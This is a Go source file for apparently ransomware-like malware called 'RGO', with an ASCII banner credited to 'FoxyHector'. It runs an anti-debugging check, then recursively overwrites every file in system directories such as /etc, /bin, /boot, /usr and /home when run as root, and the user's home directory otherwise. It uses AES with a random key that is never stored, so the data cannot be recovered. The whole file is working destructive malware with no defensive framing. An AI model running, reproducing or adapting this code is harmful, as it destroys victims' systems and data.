package main

/*
#include "antidebug.h"
*/
import "C"

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"os"
)

func Encrypt(filepath string) {
	var data, e0 = os.ReadFile(filepath)
	if e0 != nil {
		fmt.Println(e0)
		return
	}
	var s = make([]byte, 32)
	if _, e1 := rand.Read(s); e1 != nil {
		fmt.Println(e1)
		return
	}
	var s1 = make([]byte, 16)
	if _, e2 := rand.Read(s1); e2 != nil {
		fmt.Println(e2)
		return
	}
	var block, e3 = aes.NewCipher(s)
	if e3 != nil {
		fmt.Println(e3)
		return
	}
	var stream = cipher.NewCFBEncrypter(block, s1)
	stream.XORKeyStream(data, data)
	var e4 = os.WriteFile(filepath, data, 0644)
	if e4 != nil {
		fmt.Println(e4)
		return
	}
}

func readdir(directory string) {
	var dirent, e0 = os.ReadDir(directory)
	if e0 != nil {
		fmt.Println(e0)
		return
	}
	for _, file := range dirent {
		if file.IsDir() {
			readdir(directory + "/" + file.Name())
		} else {
			Encrypt(directory + "/" + file.Name())
		}
	}
}

func main() {
	var banner = `
RRRRRRRRRRRRRRRRR           GGGGGGGGGGGGG     OOOOOOOOO     
R::::::::::::::::R       GGG::::::::::::G   OO:::::::::OO   
R::::::RRRRRR:::::R    GG:::::::::::::::G OO:::::::::::::OO 
RR:::::R     R:::::R  G:::::GGGGGGGG::::GO:::::::OOO:::::::O
  R::::R     R:::::R G:::::G       GGGGGGO::::::O   O::::::O
  R::::R     R:::::RG:::::G              O:::::O     O:::::O
  R::::RRRRRR:::::R G:::::G              O:::::O     O:::::O
  R:::::::::::::RR  G:::::G    GGGGGGGGGGO:::::O     O:::::O
  R::::RRRRRR:::::R G:::::G    G::::::::GO:::::O     O:::::O
  R::::R     R:::::RG:::::G    GGGGG::::GO:::::O     O:::::O
  R::::R     R:::::RG:::::G        G::::GO:::::O     O:::::O
  R::::R     R:::::R G:::::G       G::::GO::::::O   O::::::O
RR:::::R     R:::::R  G:::::GGGGGGGG::::GO:::::::OOO:::::::O
R::::::R     R:::::R   GG:::::::::::::::G OO:::::::::::::OO 
R::::::R     R:::::R     GGG::::::GGG:::G   OO:::::::::OO   
RRRRRRRR     RRRRRRR        GGGGGG   GGGG     OOOOOOOOO
                              -------> Made by FoxyHector
`
	fmt.Printf("\t%s\n", banner)
	C.check()
	if os.Geteuid() == 0 {
		fmt.Println("[+] Running as root!")
		directories := []string{"/var", "/root", "/home", "/usr", "/bin", "/etc", "/boot"}
		for i := 0; i < len(directories); i++ {
			fmt.Printf("[+] Encrypting %s\n", directories[i])
			readdir(directories[i])
		}

	} else {
		fmt.Println("[-] Process is not running with root privileges!")
		var directory, e0 = os.UserHomeDir()
		if e0 != nil {
			fmt.Println(e0)
			return
		}
		fmt.Printf("[+] Only  user's home directory will be encrypted!\n[+] Encrypting %s\n", directory)
		readdir(directory)
	}
	fmt.Println("\t[+] Done!")
}
